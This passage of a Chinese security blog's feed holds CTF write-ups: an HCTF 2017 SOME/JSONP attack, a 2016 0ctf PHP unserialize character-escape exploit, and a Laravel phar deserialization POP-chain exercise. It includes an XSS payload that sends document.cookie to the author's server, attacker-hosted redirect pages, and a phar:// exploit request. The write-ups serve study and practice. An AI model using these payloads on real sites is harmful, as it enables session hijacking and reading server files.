class="string">"mess"</span>).innerHTML=<span class="string">"Message: "</span>+message;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Update user profile success..."</span>);</span><br><span class="line"><span class="built_in">window</span>.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EditProfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">document</span>.onkeydown=<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (event.keyCode == <span class="number">13</span>)&#123;</span><br><span class="line">UpdateProfile();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RandomProfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">setTimeout(<span class="string">'UpdateProfile()'</span>, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>整个流程大致意思是，修改子窗口的时候，关闭子窗口会将子窗口内容传给父窗口，并且子窗口有个jsonp的回调函数负责传递方法callback。</p><p>主页面中还有一个clickme 执行了random方法具体函数如下<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> newWin = <span class="built_in">window</span>.open(<span class="string">"./edit.php?callback=RandomProfile"</span>,<span class="string">''</span>,<span class="string">'width=600,height=600'</span>);</span><br><span class="line"><span class="keyword">var</span> loop = setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="keyword">if</span>(newWin.closed) &#123;  </span><br><span class="line">    clearInterval(loop);  </span><br><span class="line">    update();</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure></p><p>而random方法又会执行RandomProfile，RandomProfile又会执行UpdateProfile<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RandomProfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">setTimeout(<span class="string">'UpdateProfile()'</span>, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><hr><p>这里我们需要使用some攻击<br>首先我们在自己vps中创建两个页面1.html，2.html<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">start_some</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">window</span>.open(<span class="string">"2.html"</span>);</span><br><span class="line">        location.replace(<span class="string">"http://desert.2017.hctf.io/user.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setTimeout(start_some(), <span class="number">1000</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        location.replace(<span class="string">"http://desert.2017.hctf.io/edit.php?callback=RandomProfile&amp;user=xxx"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setTimeout(attack, <span class="number">2000</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>xxx为自己创建的用户名字</p><p>然后在xxx用户的message写入payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;\&quot; onerror=window.location.href=&apos;http://vps?cookie=&apos;%2bdocument.cookie&gt;</span><br></pre></td></tr></table></figure></p><p>使用report方法，使admin用户访问1.html，最终getflag</p><p>其实本身我对于some攻击其实还是不是非常了解<br>小小的总结下Str3am师傅对其的解释（顺便也能够帮助我了解同源策略以及jsonp</p><blockquote><p><a href="https://www.freebuf.com/articles/web/169873.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/169873.html</a></p></blockquote><p>Some 攻击首先是要对于同源策略以及jsonp有所了解,</p><blockquote><p><a href="https://www.someattack.com/Playground/About" target="_blank" rel="noopener">https://www.someattack.com/Playground/About</a><br>这是一个some攻击的靶场<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">JSONP为一种用户可控制js执行函数的跨域数据访问技术</span><br><span class="line">正是由于JSONP可以控制执行函数的特性，产生了SOME攻击，</span><br><span class="line">（就比如说这题由于用户能够控callback中的函数所以导致了some攻击，</span><br><span class="line">这里主要涉及到一个jsonp的技术（我本身暂时还没有了解</span><br><span class="line"></span><br><span class="line">some攻击在目前我看来是一种xss的扩展，</span><br><span class="line">通过构造payload使得父页面以及子页面同源，</span><br><span class="line">使得子页面的domxss能够对父页面进行某种操作</span><br><span class="line"></span><br><span class="line">具体这个some攻击的产生原因我还没有特地深入了解</span><br><span class="line">其实我认为使用window.open产生的父页面以及子页面应该就算是同源了。</span><br><span class="line">但是在这题中admin打开的页面并非是自己的子页面</span><br><span class="line">所以需要在自己vps中构造payload使得它们同源</span><br><span class="line">（这里有个地方注意的是firefox与chrome已经禁止了window.open，可以使用iframe代替</span><br></pre></td></tr></table></figure></p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://lorexxar.cn/2017/11/15/hctf2017-deserted-world/" target="_blank" rel="noopener">https://lorexxar.cn/2017/11/15/hctf2017-deserted-world/</a><br><a href="https://www.freebuf.com/articles/web/169873.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/169873.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      some攻击可以看成是xss的一种扩展
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="xss" scheme="https://museljh.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>0ctf_2016_unserialize(php反序列化逃逸字符)</title>
    <link href="https://museljh.github.io/2019/03/20/0ctf_2016_unserialize(php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E5%AD%97%E7%AC%A6)/"/>
    <id>https://museljh.github.io/2019/03/20/0ctf_2016_unserialize(php反序列化逃逸字符)/</id>
    <published>2019-03-19T16:11:21.000Z</published>
    <updated>2019-03-19T16:52:04.198Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一-0ctf-2016-unserialize-php反序列化逃逸字符"><a href="#一-0ctf-2016-unserialize-php反序列化逃逸字符" class="headerlink" title="一.0ctf_2016_unserialize(php反序列化逃逸字符)"></a>一.0ctf_2016_unserialize(php反序列化逃逸字符)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">知识点:</span><br><span class="line">* 代码审计</span><br><span class="line">* Unserialize</span><br><span class="line">* LFR</span><br></pre></td></tr></table></figure><p><a href="http://www.Zip源码泄露获取源码" target="_blank" rel="noopener">www.Zip源码泄露获取源码</a></p><p>通过源码，我们可以发现在config.php中的flag，这题意图已经很明显了，是要我们读取config.php文件的内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$config[&apos;hostname&apos;] = &apos;127.0.0.1&apos;;</span><br><span class="line">$config[&apos;username&apos;] = &apos;root&apos;;</span><br><span class="line">$config[&apos;password&apos;] = &apos;&apos;;</span><br><span class="line">$config[&apos;database&apos;] = &apos;&apos;;</span><br><span class="line">$flag = &apos;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>注册并登入，在cookie里发现bottle.session，说明很有可能这道题目是由Python的 bottle框架搭建的，与此同时在profile.php找到<code>$profile = unserialize($profile);</code>，        <code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code>中包含有<code>unserialize</code>与<code>file_get_contents</code>，猜测这道题是需要利用unserialize反序列构造file_get_contents执行RCE。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[&apos;phone&apos;];</span><br><span class="line">$email = $profile[&apos;email&apos;];</span><br><span class="line">$nickname = $profile[&apos;nickname&apos;];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[&apos;photo&apos;]));</span><br></pre></td></tr></table></figure></p><p>可以看到无论是<code>file_get_contents($profile[&#39;photo&#39;])</code>，还是<code>unserialize($profile)</code>都是通过<code>$profile</code>进行控制的，我们现在看看<code>$profile</code>变量能否被我们控制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = $_SESSION[&apos;username&apos;];</span><br><span class="line">$profile=$user-&gt;show_profile($username);</span><br><span class="line">if($profile  == null) &#123;</span><br></pre></td></tr></table></figure></p><p>经过查找我们可以发现<code>$profile</code> 变量来源于<code>show_profile</code>方法，我们通过传入一个<code>$username</code>变量后引用了父类mysql的方法<code>filter</code>、<code>select</code>，最后返回了一个<code>$object</code>，而<code>profile</code>就是在这个<code>$object</code>变量中，让我看看mysql类中的函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">    class user &#123;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">        public function show_profile($username) &#123;</span><br><span class="line">            $username = parent::filter($username);</span><br><span class="line"></span><br><span class="line">            $where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">            $object = parent::select($this-&gt;table, $where);</span><br><span class="line">            return $object-&gt;profile;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    class mysql &#123;</span><br><span class="line">private $link = null;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">public function select($table, $where, $ret = &apos;*&apos;) &#123;</span><br><span class="line">$sql = &quot;SELECT $ret FROM $table WHERE $where&quot;;</span><br><span class="line">$result = mysql_query($sql, $this-&gt;link);</span><br><span class="line">return mysql_fetch_object($result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">public function filter($string) &#123;</span><br><span class="line">$escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);</span><br><span class="line">$escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;</span><br><span class="line">$string = preg_replace($escape, &apos;_&apos;, $string);</span><br><span class="line"></span><br><span class="line">$safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);</span><br><span class="line">$safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;</span><br><span class="line">return preg_replace($safe, &apos;hacker&apos;, $string);</span><br><span class="line">&#125;</span><br><span class="line">public function __tostring() &#123;</span><br><span class="line">return __class__;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这一连串代码作用已经很明显是要验证用户信息的。<code>filter</code>方法防止我们将会过滤符号\,\\字符串<code>select</code>,<code>insert</code>,<code>update</code>,<code>delete</code>。</p><p>经过寻找我们可以找到</p><p><code>$profile[&#39;photo&#39;])</code>  是源于update.php中        <code>$profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&apos;/^\d&#123;11&#125;$/&apos;, $_POST[&apos;phone&apos;]))</span><br><span class="line">die(&apos;Invalid phone&apos;);</span><br><span class="line"></span><br><span class="line">if(!preg_match(&apos;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&apos;, $_POST[&apos;email&apos;]))</span><br><span class="line">die(&apos;Invalid email&apos;);</span><br><span class="line"></span><br><span class="line">if(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10)</span><br><span class="line">die(&apos;Invalid nickname&apos;);</span><br><span class="line"></span><br><span class="line">$file = $_FILES[&apos;photo&apos;];</span><br><span class="line">if($file[&apos;size&apos;] &lt; 5 or $file[&apos;size&apos;] &gt; 1000000)</span><br><span class="line">die(&apos;Photo size error&apos;);</span><br><span class="line"></span><br><span class="line">move_uploaded_file($file[&apos;tmp_name&apos;], &apos;upload/&apos; . md5($file[&apos;name&apos;]));</span><br><span class="line">$profile[&apos;phone&apos;] = $_POST[&apos;phone&apos;];</span><br><span class="line">$profile[&apos;email&apos;] = $_POST[&apos;email&apos;];</span><br><span class="line">$profile[&apos;nickname&apos;] = $_POST[&apos;nickname&apos;];</span><br><span class="line">$profile[&apos;photo&apos;] = &apos;upload/&apos; . md5($file[&apos;name&apos;]);</span><br><span class="line">      $user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">echo &apos;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&apos;;</span><br></pre></td></tr></table></figure></p><p>原本这段其实是没有问题的，关键是它先将<code>$profile</code>进行序列化后再进行存入数据库，而<code>filter</code>函数中会将<code>where</code>字符串转换成<code>hacker</code>，where是五个字符而hacker是六个字符，这样就给我提供了反序列化逃逸字符的条件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public function filter($string) &#123;</span><br><span class="line">$escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);</span><br><span class="line">$escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;</span><br><span class="line">$string = preg_replace($escape, &apos;_&apos;, $string);</span><br><span class="line"></span><br><span class="line">$safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);</span><br><span class="line">$safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;</span><br><span class="line">return preg_replace($safe, &apos;hacker&apos;, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>反序列化逃逸字符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        //Enter your code here, enjoy!</span><br><span class="line"></span><br><span class="line">$profile[&apos;phone&apos;] = &apos;11115908609&apos;;</span><br><span class="line">$profile[&apos;email&apos;] = &apos;1049135811@qq.com&apos;;</span><br><span class="line">$profile[&apos;nickname&apos;] = &apos;aa&apos;;</span><br><span class="line">$profile[&apos;photo&apos;] = &apos;aaa&apos;;</span><br><span class="line">$a=serialize($profile);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure></p><p>输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11115908609&quot;;s:5:&quot;email&quot;;s:17:&quot;1049135811@qq.com&quot;;s:8:&quot;nickname&quot;;s:2:&quot;aa&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>我们修改下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$profile[&apos;nickname&apos;] = &apos;aa&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;&#125;&apos;;</span><br></pre></td></tr></table></figure></p><p>输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11115908609&quot;;s:5:&quot;email&quot;;s:17:&quot;1049135811@qq.com&quot;;s:8:&quot;nickname&quot;;s:27:&quot;aa&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>因为多出<code>&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;}</code><br>于是我们可以hacker比where多的字符将其顶替,这里多处的字符用1代替<br>比如这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11115908609&quot;;s:5:&quot;email&quot;;s:17:&quot;1049135811@qq.com&quot;;s:8:&quot;nickname&quot;;s:27:&quot;aa1111111111111111111111111&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>最后得到<br><img src="https://i.imgur.com/hvvkk2B.png" alt=""><br>同理我们可以将aaa换成我们想要的比如config.php就可以读出flag了,<br>将得到的base64解码后的到flag<br><img src="https://i.imgur.com/YpHBfEu.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="http://blog.nsfocus.net/rpo-attack/" target="_blank" rel="noopener">http://blog.nsfocus.net/rpo-attack/</a><br><a href="https://lorexxar.cn/2018/01/02/34c3-writeup/#urlstorage" target="_blank" rel="noopener">https://lorexxar.cn/2018/01/02/34c3-writeup/#urlstorage</a><br><a href="http://www.yqxiaojunjie.com/index.php/archives/171/" target="_blank" rel="noopener">http://www.yqxiaojunjie.com/index.php/archives/171/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      使用unserialize逃逸出多余的字符串导致命令执行
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="php反序列化" scheme="https://museljh.github.io/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化之寻找pop链入门练习</title>
    <link href="https://museljh.github.io/2019/03/10/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AF%BB%E6%89%BEpop%E9%93%BE%E5%85%A5%E9%97%A8%E7%BB%83%E4%B9%A0/"/>
    <id>https://museljh.github.io/2019/03/10/PHP反序列化之寻找pop链入门练习/</id>
    <published>2019-03-10T05:43:58.000Z</published>
    <updated>2019-03-10T05:49:05.223Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文不仅是对php反序列化Pop链的寻找，同时也是加深我对Laravel框架的理解</p><h2 id="lumenserial"><a href="#lumenserial" class="headerlink" title="lumenserial"></a>lumenserial</h2><p>本文基于本文以 code-breaking 中 lumenserial 为例，该题是基于Laravel框架搭建的，主要是看到安全客有一个师傅写了一篇关于这个的练习，感觉很不错，所以拿这题来练习。之前对于PHP框架只有稍微了解了下ThinkPHP有所了解，对这个框架第一印象是感觉这很像传统PHP框架和python框架的结合，之后看了下对于它源码的解析后才觉得这个框架有点牛逼。写这题也是提升自己对Laravel框架理解。<br>题目地址:</p><blockquote><p><a href="https://code-breaking.com/puzzle/7/" target="_blank" rel="noopener">https://code-breaking.com/puzzle/7/</a></p></blockquote><p>更新P牛制作的docker环境(我觉得有点问题，但是修改了半天DockerFile文件还是不可以，不知道为什么) </p><blockquote><p><a href="https://github.com/phith0n/code-breaking" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking</a></p></blockquote><p>利用 phar 拓展 php 反序列化漏洞攻击面</p><blockquote><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p></blockquote><blockquote></blockquote><p>一句话总结下Phar反序列就是构造个phar格式的文件里面有我们需要序列化的内容，这种格式它会自己序列化，然后通过一些可控的文件函数通过Phar：//xxx，去调用这个文件然后就反序列，具体看</p><blockquote><p><a href="http://www.lmxspace.com/2018/11/07/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Phar/" target="_blank" rel="noopener">http://www.lmxspace.com/2018/11/07/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Phar/</a><br><a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/38</a></p></blockquote><p>其实对于这题来说<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    protected function doCatchimage(Request $request)</span><br><span class="line">    &#123;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">        if ($sources) &#123;</span><br><span class="line">            foreach ($sources as $url) &#123;</span><br><span class="line">                $rets[] = $this-&gt;download($url);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    private function download($url)</span><br><span class="line">    &#123;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">        $content = file_get_contents($url);</span><br><span class="line">        $img = getimagesizefromstring($content);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在EditorController.php中有一个doCatchimage方法，可以传入一个数组变量$sources，调用download($url)方法,url 变量没有经过任何处理用在了 file_get_contents 函数中，不过貌似对于laravel框架还是有对函数进行过滤的，<br>至于在哪里禁用的我找半天没找到，禁用了以下函数（好吧后来我看到别的师傅写道，这些信息通过 phpggc 的第一个 Laravel 框架 RCE 生成 phpinfo 函数的利用 phar 即可看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">disable_functions：</span><br><span class="line">system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log</span><br><span class="line"></span><br><span class="line">disable_classes：</span><br><span class="line">GlobIterator,DirectoryIterator,FilesystemIterator,RecursiveDirectoryIterator</span><br></pre></td></tr></table></figure></p><p>我们可以使用phar进行反序列，构造如下代码进行利用，但是如何找到可利用的方法是一个难题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://website/server/editor/?action=Catchimage&amp;source[]=phar://xxx.gif</span><br></pre></td></tr></table></figure><p>可以通过PHPGGC寻找到Laravel框架RCE 的 4种payload 。<br>我们稍微讲下其中一条Pop链，其他的应该类比就可以挖掘<br>主要讲的是RCE1<br>可以看到在PHPGGC中它是这样表示的。<br><img src="https://i.imgur.com/BLwelLd.png" alt=""></p><p>其实七月火师傅已经讲的很清晰了，如果一下看不是非常明白，可以去多了解下Laravel框架，回头再看会清晰一些。</p><blockquote><p><a href="https://www.anquanke.com/post/id/170681" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170681</a></p></blockquote><p><img src="https://i.imgur.com/NoatfJa.png" alt=""><br>这张是来自七月火师傅，感觉没有这张图理解起来会比较困难</p><p>Pop链：</p><p>1.毫无疑问laravel框架的四个RCE都是从PendingBroadcast-&gt;__destruct()方法出去的，</p><hr><p>以下均为我个人理解（目的是更好、好来更好理解laravel框架源码loc容器）：PendingBroadcast这个函数是laravel框架事件调用的具体类，并且通过BroadcastManager类注册PendingBroadcast进laravel框架loc容器中（BroadcastManager类继承了FactoryContract类）</p><p>FactoryContract类是一种的loc容器的合约规定了各种容器的模板，<br>可以看到如下有许多类型很多类似PendingBroadcast的loc实现类继承了FactoryContract的loc合约类（实现类，合约类是我乱讲的估计是没有这个玩意），并且这些实现类中又注册了各种laravel框架的具体实现类，<br><img src="https://i.imgur.com/rmmxUFe.png" alt=""></p><p>比如说PendingBroadcast类就是实现了对于事件调用，也就是even的具体实现，而在laravel框架 App\Events 下面的even.php就是通过 Illuminate\Support\Facades 下面的even.php，返回的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Event extends Facade</span><br><span class="line">&#123;</span><br><span class="line">   ...</span><br><span class="line">   ...</span><br><span class="line">    protected static function getFacadeAccessor()</span><br><span class="line">    &#123;</span><br><span class="line">        return &apos;events&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class Facade</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        $factory = new Factory;</span><br><span class="line"></span><br><span class="line">        $iterator = $factory-&gt;getFileIterator($paths, $suffixes, $prefixes, $exclude);</span><br><span class="line"></span><br><span class="line">        $files = [];</span><br><span class="line"></span><br><span class="line">        foreach ($iterator as $file) &#123;</span><br><span class="line">            $file = $file-&gt;getRealPath();</span><br><span class="line"></span><br><span class="line">            if ($file) &#123;</span><br><span class="line">                $files[] = $file;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br><span 